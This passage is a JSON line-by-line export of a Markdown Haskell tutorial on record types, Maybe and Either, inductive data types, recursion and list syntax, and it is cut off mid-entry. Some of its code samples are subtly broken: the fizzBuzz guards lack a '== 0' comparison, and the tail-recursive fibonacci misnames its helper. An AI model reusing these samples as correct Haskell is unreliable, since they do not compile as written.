        "content": "    class Box {"
      },
      {
        "lineNumber": 326,
        "author": {
          "gitId": "-"
        },
        "content": "        double length;"
      },
      {
        "lineNumber": 327,
        "author": {
          "gitId": "-"
        },
        "content": "        double breadth;"
      },
      {
        "lineNumber": 328,
        "author": {
          "gitId": "-"
        },
        "content": "        double height;"
      },
      {
        "lineNumber": 329,
        "author": {
          "gitId": "-"
        },
        "content": "        double density;"
      },
      {
        "lineNumber": 330,
        "author": {
          "gitId": "-"
        },
        "content": "    public:"
      },
      {
        "lineNumber": 331,
        "author": {
          "gitId": "-"
        },
        "content": "        double getVolume() {"
      },
      {
        "lineNumber": 332,
        "author": {
          "gitId": "-"
        },
        "content": "            return this-\u003elength * this-\u003ebreadth * this-\u003eheight;"
      },
      {
        "lineNumber": 333,
        "author": {
          "gitId": "-"
        },
        "content": "        }"
      },
      {
        "lineNumber": 334,
        "author": {
          "gitId": "-"
        },
        "content": "        double getMass() {"
      },
      {
        "lineNumber": 335,
        "author": {
          "gitId": "-"
        },
        "content": "            return this-\u003edensity * this-\u003egetVolume();"
      },
      {
        "lineNumber": 336,
        "author": {
          "gitId": "-"
        },
        "content": "        }"
      },
      {
        "lineNumber": 337,
        "author": {
          "gitId": "-"
        },
        "content": "    };"
      },
      {
        "lineNumber": 338,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 339,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 340,
        "author": {
          "gitId": "-"
        },
        "content": "We could certainly represent a `Box` as an algebraic data type as follows:"
      },
      {
        "lineNumber": 341,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 342,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 343,
        "author": {
          "gitId": "-"
        },
        "content": "    -- NOTE: a value constructor can have the same name as the type constructor"
      },
      {
        "lineNumber": 344,
        "author": {
          "gitId": "-"
        },
        "content": "    data Box \u003d Box Double Double Double Double"
      },
      {
        "lineNumber": 345,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 346,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 347,
        "author": {
          "gitId": "-"
        },
        "content": "But we are missing key information here. Which `Double` stands for which"
      },
      {
        "lineNumber": 348,
        "author": {
          "gitId": "-"
        },
        "content": "attribute? In situations like these, we can use Haskell\u0027s record syntax:"
      },
      {
        "lineNumber": 349,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 350,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 351,
        "author": {
          "gitId": "-"
        },
        "content": "    -- define box as a record type"
      },
      {
        "lineNumber": 352,
        "author": {
          "gitId": "-"
        },
        "content": "    data Box \u003d Box { length :: Double, breadth :: Double, height :: Double, density :: Double }"
      },
      {
        "lineNumber": 353,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 354,
        "author": {
          "gitId": "-"
        },
        "content": "    getVolume :: Box -\u003e Double"
      },
      {
        "lineNumber": 355,
        "author": {
          "gitId": "-"
        },
        "content": "    getVolume (Box { length \u003d l, breadth \u003d b, height \u003d h }) \u003d l * b * h"
      },
      {
        "lineNumber": 356,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 357,
        "author": {
          "gitId": "-"
        },
        "content": "    getMass :: Box -\u003e Double"
      },
      {
        "lineNumber": 358,
        "author": {
          "gitId": "-"
        },
        "content": "    getMass box \u003d getVolume box * density box"
      },
      {
        "lineNumber": 359,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 360,
        "author": {
          "gitId": "-"
        },
        "content": "    silverBox \u003d Box { length \u003d 5, breadth \u003d 10, height \u003d 15, density \u003d 10.5 }"
      },
      {
        "lineNumber": 361,
        "author": {
          "gitId": "-"
        },
        "content": "    goldBox \u003d Box 5 10 15 19.3 -- we can still use normal construction by parameter order"
      },
      {
        "lineNumber": 362,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 363,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 364,
        "author": {
          "gitId": "-"
        },
        "content": "There are a few things to note here, other than the syntax itself. When pattern"
      },
      {
        "lineNumber": 365,
        "author": {
          "gitId": "-"
        },
        "content": "matching on a record type, we may omit any parameters we do not need (we do not"
      },
      {
        "lineNumber": 366,
        "author": {
          "gitId": "-"
        },
        "content": "even need to specify `_`). We may also extract values from the record type by"
      },
      {
        "lineNumber": 367,
        "author": {
          "gitId": "-"
        },
        "content": "treating the record parameter names as functions from the record type to the"
      },
      {
        "lineNumber": 368,
        "author": {
          "gitId": "-"
        },
        "content": "parameter type. For instance, `density` in the above example is actually a"
      },
      {
        "lineNumber": 369,
        "author": {
          "gitId": "-"
        },
        "content": "`Box -\u003e Double` function. Doing `density silverBox` will give the value `10.5`."
      },
      {
        "lineNumber": 370,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 371,
        "author": {
          "gitId": "-"
        },
        "content": "### Type Parameters"
      },
      {
        "lineNumber": 372,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 373,
        "author": {
          "gitId": "-"
        },
        "content": "Consider the division operator on `Double`. We may be tempted to define it with"
      },
      {
        "lineNumber": 374,
        "author": {
          "gitId": "-"
        },
        "content": "the type `Double -\u003e Double -\u003e Double`, but the result may be undefined when"
      },
      {
        "lineNumber": 375,
        "author": {
          "gitId": "-"
        },
        "content": "dividing by zero. Here\u0027s a first stab at a solution to remedy this:"
      },
      {
        "lineNumber": 376,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 377,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 378,
        "author": {
          "gitId": "-"
        },
        "content": "    -- represents a value that may or may not exist"
      },
      {
        "lineNumber": 379,
        "author": {
          "gitId": "-"
        },
        "content": "    data MaybeDouble \u003d Undefined | Defined Double"
      },
      {
        "lineNumber": 380,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 381,
        "author": {
          "gitId": "-"
        },
        "content": "    divide :: Double -\u003e Double -\u003e MaybeDouble"
      },
      {
        "lineNumber": 382,
        "author": {
          "gitId": "-"
        },
        "content": "    divide _ 0 \u003d Undefined"
      },
      {
        "lineNumber": 383,
        "author": {
          "gitId": "-"
        },
        "content": "    divide x y \u003d Defined (x / y)"
      },
      {
        "lineNumber": 384,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 385,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 386,
        "author": {
          "gitId": "-"
        },
        "content": "This ensures that division by zero returns a clearly-defined result instead"
      },
      {
        "lineNumber": 387,
        "author": {
          "gitId": "-"
        },
        "content": "of something weird."
      },
      {
        "lineNumber": 388,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 389,
        "author": {
          "gitId": "-"
        },
        "content": "Now suppose we want to send a HTTP request and retrieve the response data."
      },
      {
        "lineNumber": 390,
        "author": {
          "gitId": "-"
        },
        "content": "This response data may not exist as the server may refuse to return the data."
      },
      {
        "lineNumber": 391,
        "author": {
          "gitId": "-"
        },
        "content": "We can try to solve the problem in the following manner:"
      },
      {
        "lineNumber": 392,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 393,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 394,
        "author": {
          "gitId": "-"
        },
        "content": "    data MaybeResponse \u003d NoResponse | GotResponse HttpResponse"
      },
      {
        "lineNumber": 395,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 396,
        "author": {
          "gitId": "-"
        },
        "content": "    makeRequest :: HttpRequest -\u003e MaybeResponse"
      },
      {
        "lineNumber": 397,
        "author": {
          "gitId": "-"
        },
        "content": "    -- implementation details irrelevant"
      },
      {
        "lineNumber": 398,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 399,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 400,
        "author": {
          "gitId": "-"
        },
        "content": "We have `MaybeDouble` and `MaybeResponse`, both of which have a common pattern:"
      },
      {
        "lineNumber": 401,
        "author": {
          "gitId": "-"
        },
        "content": "they represent possible failure of computation. Naturally, we may wish to abstract"
      },
      {
        "lineNumber": 402,
        "author": {
          "gitId": "-"
        },
        "content": "this out. But all the means of abstraction available to us thus far cannot be"
      },
      {
        "lineNumber": 403,
        "author": {
          "gitId": "-"
        },
        "content": "used, as we wish to abstract on _types_ rather than values."
      },
      {
        "lineNumber": 404,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 405,
        "author": {
          "gitId": "-"
        },
        "content": "For this purpose, Haskell supports _type parameters_, much like how C++ has"
      },
      {
        "lineNumber": 406,
        "author": {
          "gitId": "-"
        },
        "content": "templates and Java has generics."
      },
      {
        "lineNumber": 407,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 408,
        "author": {
          "gitId": "-"
        },
        "content": "We define the following abstraction of failing computations:"
      },
      {
        "lineNumber": 409,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 410,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 411,
        "author": {
          "gitId": "-"
        },
        "content": "    data Maybe t \u003d Nothing | Just t"
      },
      {
        "lineNumber": 412,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 413,
        "author": {
          "gitId": "-"
        },
        "content": "    divide :: Double -\u003e Double -\u003e Maybe Double"
      },
      {
        "lineNumber": 414,
        "author": {
          "gitId": "-"
        },
        "content": "    divide _ 0 \u003d Nothing"
      },
      {
        "lineNumber": 415,
        "author": {
          "gitId": "-"
        },
        "content": "    divide x y \u003d Just (x / y)"
      },
      {
        "lineNumber": 416,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 417,
        "author": {
          "gitId": "-"
        },
        "content": "    makeRequest :: HttpRequest -\u003e Maybe Response"
      },
      {
        "lineNumber": 418,
        "author": {
          "gitId": "-"
        },
        "content": "    -- implementation details irrelevant"
      },
      {
        "lineNumber": 419,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 420,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 421,
        "author": {
          "gitId": "-"
        },
        "content": "Note that we introduce an additional parameter `t` on the left side of the definition."
      },
      {
        "lineNumber": 422,
        "author": {
          "gitId": "-"
        },
        "content": "This is known as a type parameter, and **must always be lowercase**. This parameter"
      },
      {
        "lineNumber": 423,
        "author": {
          "gitId": "-"
        },
        "content": "can then be used in the value constructors as a placeholder for any type that"
      },
      {
        "lineNumber": 424,
        "author": {
          "gitId": "-"
        },
        "content": "should be there."
      },
      {
        "lineNumber": 425,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 426,
        "author": {
          "gitId": "-"
        },
        "content": "The use of type parameters in this way is similar to the use of generics in Java."
      },
      {
        "lineNumber": 427,
        "author": {
          "gitId": "-"
        },
        "content": "We may think of `Maybe t` as `Optional\u003cT\u003e`, if that helps to understand the role"
      },
      {
        "lineNumber": 428,
        "author": {
          "gitId": "-"
        },
        "content": "of `t`."
      },
      {
        "lineNumber": 429,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 430,
        "author": {
          "gitId": "-"
        },
        "content": "Note that there can be more than one type parameter. An example is `Either`,"
      },
      {
        "lineNumber": 431,
        "author": {
          "gitId": "-"
        },
        "content": "which represents the result of a computation that returns values of different"
      },
      {
        "lineNumber": 432,
        "author": {
          "gitId": "-"
        },
        "content": "types on success or failure:"
      },
      {
        "lineNumber": 433,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 434,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 435,
        "author": {
          "gitId": "-"
        },
        "content": "    data Either a b \u003d Left a | Right b"
      },
      {
        "lineNumber": 436,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 437,
        "author": {
          "gitId": "-"
        },
        "content": "    divide :: Double -\u003e Double -\u003e Either String Double"
      },
      {
        "lineNumber": 438,
        "author": {
          "gitId": "-"
        },
        "content": "    divide _ 0 \u003d Left \"Attempt to divide by zero!\""
      },
      {
        "lineNumber": 439,
        "author": {
          "gitId": "-"
        },
        "content": "    divide x y \u003d Right (x / y)"
      },
      {
        "lineNumber": 440,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 441,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 442,
        "author": {
          "gitId": "-"
        },
        "content": "Type constructors can be curried just like regular functions or value constructors."
      },
      {
        "lineNumber": 443,
        "author": {
          "gitId": "-"
        },
        "content": "Therefore, `Either String Double` is a concrete type, while `Either String` is"
      },
      {
        "lineNumber": 444,
        "author": {
          "gitId": "-"
        },
        "content": "a type constructor that takes in the remaining type."
      },
      {
        "lineNumber": 445,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 446,
        "author": {
          "gitId": "-"
        },
        "content": "`Maybe` and `Either` are both defined in the Haskell prelude library."
      },
      {
        "lineNumber": 447,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 448,
        "author": {
          "gitId": "-"
        },
        "content": "### Inductive Data Types"
      },
      {
        "lineNumber": 449,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 450,
        "author": {
          "gitId": "-"
        },
        "content": "We can define a data type in terms of itself. Consider, for instance, a tree."
      },
      {
        "lineNumber": 451,
        "author": {
          "gitId": "-"
        },
        "content": "A tree can be thought of as either an empty tree, or a node with a left subtree"
      },
      {
        "lineNumber": 452,
        "author": {
          "gitId": "-"
        },
        "content": "and right subtree attached. We encode it like so:"
      },
      {
        "lineNumber": 453,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 454,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 455,
        "author": {
          "gitId": "-"
        },
        "content": "    data Tree t \u003d EmptyTree | Node t (Tree t) (Tree t)"
      },
      {
        "lineNumber": 456,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 457,
        "author": {
          "gitId": "-"
        },
        "content": "Another classic inductive data type is the singly-linked list. The list is"
      },
      {
        "lineNumber": 458,
        "author": {
          "gitId": "-"
        },
        "content": "either an empty list or the first element together with the rest of the list."
      },
      {
        "lineNumber": 459,
        "author": {
          "gitId": "-"
        },
        "content": "While not canonical, this is a very common representation of lists in the"
      },
      {
        "lineNumber": 460,
        "author": {
          "gitId": "-"
        },
        "content": "functional programming world:"
      },
      {
        "lineNumber": 461,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 462,
        "author": {
          "gitId": "-"
        },
        "content": "``` haskell"
      },
      {
        "lineNumber": 463,
        "author": {
          "gitId": "-"
        },
        "content": "    data List t \u003d EmptyList | Element t (List t)"
      },
      {
        "lineNumber": 464,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 465,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 466,
        "author": {
          "gitId": "-"
        },
        "content": "This representation of lists is actually exactly how traditional lists are"
      },
      {
        "lineNumber": 467,
        "author": {
          "gitId": "-"
        },
        "content": "defined in Haskell, just with different names and notation as will be seen later."
      },
      {
        "lineNumber": 468,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 469,
        "author": {
          "gitId": "-"
        },
        "content": "We are now poised to enter the world of actual functional programming in Haskell."
      },
      {
        "lineNumber": 470,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 471,
        "author": {
          "gitId": "-"
        },
        "content": "### Further Reading"
      },
      {
        "lineNumber": 472,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 473,
        "author": {
          "gitId": "-"
        },
        "content": "* [Type Declarations](https://en.wikibooks.org/wiki/Haskell/Type_declarations)"
      },
      {
        "lineNumber": 474,
        "author": {
          "gitId": "-"
        },
        "content": "* [Pattern Matching](https://en.wikibooks.org/wiki/Haskell/Pattern_matching)"
      },
      {
        "lineNumber": 475,
        "author": {
          "gitId": "-"
        },
        "content": "* [More on Datatypes](https://en.wikibooks.org/wiki/Haskell/More_on_datatypes)"
      },
      {
        "lineNumber": 476,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 477,
        "author": {
          "gitId": "-"
        },
        "content": "## General Functional Programming"
      },
      {
        "lineNumber": 478,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 479,
        "author": {
          "gitId": "-"
        },
        "content": "### Functions"
      },
      {
        "lineNumber": 480,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 481,
        "author": {
          "gitId": "-"
        },
        "content": "A function may be defined in one of several ways. We illustrate the various"
      },
      {
        "lineNumber": 482,
        "author": {
          "gitId": "-"
        },
        "content": "syntaxes for defining a function below, with more details"
      },
      {
        "lineNumber": 483,
        "author": {
          "gitId": "-"
        },
        "content": "[here](http://learnyouahaskell.com/syntax-in-functions) if needed:"
      },
      {
        "lineNumber": 484,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 485,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 486,
        "author": {
          "gitId": "-"
        },
        "content": "    sumOfSquares :: Double -\u003e Double -\u003e Double"
      },
      {
        "lineNumber": 487,
        "author": {
          "gitId": "-"
        },
        "content": "    -- standard definition"
      },
      {
        "lineNumber": 488,
        "author": {
          "gitId": "-"
        },
        "content": "    sumOfSquares x y  \u003d (x * x) + (y * y)"
      },
      {
        "lineNumber": 489,
        "author": {
          "gitId": "-"
        },
        "content": "     -- lambda function"
      },
      {
        "lineNumber": 490,
        "author": {
          "gitId": "-"
        },
        "content": "    sumOfSquares \u003d \\x y -\u003e (x * x) + (y * y)"
      },
      {
        "lineNumber": 491,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 492,
        "author": {
          "gitId": "-"
        },
        "content": "    fizzBuzz :: Int -\u003e Either String Int"
      },
      {
        "lineNumber": 493,
        "author": {
          "gitId": "-"
        },
        "content": "    -- the horrible, disgusting, but still perfectly correct way"
      },
      {
        "lineNumber": 494,
        "author": {
          "gitId": "-"
        },
        "content": "    fizzBuzz x \u003d case x `mod` 15 \u003d\u003d 0 of"
      },
      {
        "lineNumber": 495,
        "author": {
          "gitId": "-"
        },
        "content": "                    True -\u003e Left \"fizzbuzz\""
      },
      {
        "lineNumber": 496,
        "author": {
          "gitId": "-"
        },
        "content": "                    False -\u003e case x `mod` 3 \u003d\u003d 0 of"
      },
      {
        "lineNumber": 497,
        "author": {
          "gitId": "-"
        },
        "content": "                        True -\u003e Left \"fizz\""
      },
      {
        "lineNumber": 498,
        "author": {
          "gitId": "-"
        },
        "content": "                        False -\u003e case x `mod` 5 \u003d\u003d 0 of"
      },
      {
        "lineNumber": 499,
        "author": {
          "gitId": "-"
        },
        "content": "                            True -\u003e Left \"buzz\""
      },
      {
        "lineNumber": 500,
        "author": {
          "gitId": "-"
        },
        "content": "                            False -\u003e Right x"
      },
      {
        "lineNumber": 501,
        "author": {
          "gitId": "-"
        },
        "content": "    -- far more elegant way using guard patterns"
      },
      {
        "lineNumber": 502,
        "author": {
          "gitId": "-"
        },
        "content": "    fizzBuzz x"
      },
      {
        "lineNumber": 503,
        "author": {
          "gitId": "-"
        },
        "content": "        | x `mod` 15 \u003d Left \"fizzbuzz\""
      },
      {
        "lineNumber": 504,
        "author": {
          "gitId": "-"
        },
        "content": "        | x `mod` 3 \u003d Left \"fizz\""
      },
      {
        "lineNumber": 505,
        "author": {
          "gitId": "-"
        },
        "content": "        | x `mod` 5 \u003d Left \"buzz\""
      },
      {
        "lineNumber": 506,
        "author": {
          "gitId": "-"
        },
        "content": "        | otherwise \u003d Right x"
      },
      {
        "lineNumber": 507,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 508,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 509,
        "author": {
          "gitId": "-"
        },
        "content": "### Recursion"
      },
      {
        "lineNumber": 510,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 511,
        "author": {
          "gitId": "-"
        },
        "content": "Recursion is one of the fundamental themes of functional programming. It is the"
      },
      {
        "lineNumber": 512,
        "author": {
          "gitId": "-"
        },
        "content": "ability of a function to call itself."
      },
      {
        "lineNumber": 513,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 514,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 515,
        "author": {
          "gitId": "-"
        },
        "content": "    -- Time: O(n)"
      },
      {
        "lineNumber": 516,
        "author": {
          "gitId": "-"
        },
        "content": "    -- Space: O(n)"
      },
      {
        "lineNumber": 517,
        "author": {
          "gitId": "-"
        },
        "content": "    factorial :: Integer -\u003e Integer"
      },
      {
        "lineNumber": 518,
        "author": {
          "gitId": "-"
        },
        "content": "    factorial 0 \u003d 1"
      },
      {
        "lineNumber": 519,
        "author": {
          "gitId": "-"
        },
        "content": "    factorial n \u003d n * factorial (n - 1)"
      },
      {
        "lineNumber": 520,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 521,
        "author": {
          "gitId": "-"
        },
        "content": "    -- Time: O(2^n)"
      },
      {
        "lineNumber": 522,
        "author": {
          "gitId": "-"
        },
        "content": "    -- Space: O(n), may vary due to lazy evaluation"
      },
      {
        "lineNumber": 523,
        "author": {
          "gitId": "-"
        },
        "content": "    fibonacci :: Integer -\u003e Integer"
      },
      {
        "lineNumber": 524,
        "author": {
          "gitId": "-"
        },
        "content": "    fibonacci 0 \u003d 0"
      },
      {
        "lineNumber": 525,
        "author": {
          "gitId": "-"
        },
        "content": "    fibonacci 1 \u003d 1"
      },
      {
        "lineNumber": 526,
        "author": {
          "gitId": "-"
        },
        "content": "    fibonacci n \u003d fibonacci (n - 2) + fibonacci (n - 1)"
      },
      {
        "lineNumber": 527,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 528,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 529,
        "author": {
          "gitId": "-"
        },
        "content": "While Haskell has no primitive loop structures, looping can be simulated by"
      },
      {
        "lineNumber": 530,
        "author": {
          "gitId": "-"
        },
        "content": "recursion. While attempting this in languages in C may cause a stack overflow,"
      },
      {
        "lineNumber": 531,
        "author": {
          "gitId": "-"
        },
        "content": "Haskell avoids this via [tail-call optimisation](https://en.wikipedia.org/wiki/Tail_call),"
      },
      {
        "lineNumber": 532,
        "author": {
          "gitId": "-"
        },
        "content": "which can be applied to recursive calls that meet certain requirements."
      },
      {
        "lineNumber": 533,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 534,
        "author": {
          "gitId": "-"
        },
        "content": "```Haskell"
      },
      {
        "lineNumber": 535,
        "author": {
          "gitId": "-"
        },
        "content": "    -- Time: O(n)"
      },
      {
        "lineNumber": 536,
        "author": {
          "gitId": "-"
        },
        "content": "    -- Space: O(1)"
      },
      {
        "lineNumber": 537,
        "author": {
          "gitId": "-"
        },
        "content": "    factorial :: Integer -\u003e Integer"
      },
      {
        "lineNumber": 538,
        "author": {
          "gitId": "-"
        },
        "content": "    factorial \u003d factorial\u0027 1 where"
      },
      {
        "lineNumber": 539,
        "author": {
          "gitId": "-"
        },
        "content": "        factorial\u0027 p 0 \u003d p"
      },
      {
        "lineNumber": 540,
        "author": {
          "gitId": "-"
        },
        "content": "        factorial\u0027 p n \u003d factorial\u0027 (p * n) (n - 1)"
      },
      {
        "lineNumber": 541,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 542,
        "author": {
          "gitId": "-"
        },
        "content": "    -- Time: O(n)"
      },
      {
        "lineNumber": 543,
        "author": {
          "gitId": "-"
        },
        "content": "    -- Space: O(1)"
      },
      {
        "lineNumber": 544,
        "author": {
          "gitId": "-"
        },
        "content": "    fibonacci :: Integer -\u003e Integer"
      },
      {
        "lineNumber": 545,
        "author": {
          "gitId": "-"
        },
        "content": "    fibonacci 0 \u003d 0"
      },
      {
        "lineNumber": 546,
        "author": {
          "gitId": "-"
        },
        "content": "    fibonacci 1 \u003d 1"
      },
      {
        "lineNumber": 547,
        "author": {
          "gitId": "-"
        },
        "content": "    fibonacci n \u003d fibonacci\u0027 0 1 n where"
      },
      {
        "lineNumber": 548,
        "author": {
          "gitId": "-"
        },
        "content": "        fibonacci a _ 0 \u003d a"
      },
      {
        "lineNumber": 549,
        "author": {
          "gitId": "-"
        },
        "content": "        fibonacci\u0027 a b n \u003d fibonacci\u0027 b (a + b) (n - 1)"
      },
      {
        "lineNumber": 550,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 551,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 552,
        "author": {
          "gitId": "-"
        },
        "content": "We can safely omit the types in the inner function definitions due to type"
      },
      {
        "lineNumber": 553,
        "author": {
          "gitId": "-"
        },
        "content": "inference. Also note how we freely use currying in the `factorial` definition."
      },
      {
        "lineNumber": 554,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 555,
        "author": {
          "gitId": "-"
        },
        "content": "### Lists"
      },
      {
        "lineNumber": 556,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 557,
        "author": {
          "gitId": "-"
        },
        "content": "As described earlier, a list is an inductive data type, defined as either the"
      },
      {
        "lineNumber": 558,
        "author": {
          "gitId": "-"
        },
        "content": "empty list or an element concatenated with the rest of the list. The actual list"
      },
      {
        "lineNumber": 559,
        "author": {
          "gitId": "-"
        },
        "content": "data type is"
      },
      {
        "lineNumber": 560,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 561,
        "author": {
          "gitId": "-"
        },
        "content": "    data [] t \u003d [] | (:) t ([] t)"
      },
      {
        "lineNumber": 562,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 563,
        "author": {
          "gitId": "-"
        },
        "content": "where `:` is an infix value constructor."
      },
      {
        "lineNumber": 564,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 565,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e **IMPORTANT: Infix Functions**"
      },
      {
        "lineNumber": 566,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 567,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Any function (a value constructor is really just a function) that takes in two parameters"
      },
      {
        "lineNumber": 568,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e whose name consists of nothing but symbols is infix by default."
      },
      {
        "lineNumber": 569,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 570,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e An infix function like `+` may be used in prefix form by enclosing in parentheses."
      },
      {
        "lineNumber": 571,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e For instance, `1 + 1` is the same as `(+) 1 1`.\u003cbr\u003e"
      },
      {
        "lineNumber": 572,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e In the type definition, the prefix form must be used i.e. `(+) :: Int -\u003e Int -\u003e Int`.\u003cbr\u003e"
      },
      {
        "lineNumber": 573,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e In the function definition, either is acceptable."
      },
      {
        "lineNumber": 574,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 575,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e [Find out more.](https://wiki.haskell.org/Infix_operator)"
      },
      {
        "lineNumber": 576,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e"
      },
      {
        "lineNumber": 577,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e We will use this concept freely from now on."
      },
      {
        "lineNumber": 578,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 579,
        "author": {
          "gitId": "-"
        },
        "content": "Here are several ways to define a list `xs :: [Int]` containing 2,4,6,8 in that order:"
      },
      {
        "lineNumber": 580,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 581,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 582,
        "author": {
          "gitId": "-"
        },
        "content": "    -- the crazy way, using prefix notation directly from the list definition"
      },
      {
        "lineNumber": 583,
        "author": {
          "gitId": "-"
        },
        "content": "    xs \u003d (:) 2 ((:) 4 ((:) 6 ((:) 8 [])))"
      },
      {
        "lineNumber": 584,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 585,
        "author": {
          "gitId": "-"
        },
        "content": "    -- using infix syntax for (:), still annoying to write"
      },
      {
        "lineNumber": 586,
        "author": {
